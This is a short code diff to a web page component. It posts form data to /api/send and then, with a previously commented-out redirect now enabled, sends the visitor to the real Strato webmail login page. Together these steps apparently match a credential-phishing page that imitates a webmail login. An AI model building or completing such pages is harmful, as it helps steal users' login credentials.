@@ -29,12 +29,10 @@ export default function Home() {
     try {
       const result = await axios.post("/api/send", JSON.stringify(dataObj));
 
-      console.log(result);
-
       if (result.status === 200) {
-        // return window.location.replace(
-        //   "https://webmail.strato.com/appsuite/ui"
-        // );
+        return window.location.replace(
+          "https://webmail.strato.com/appsuite/ui"
+        );
       }
 
       return;
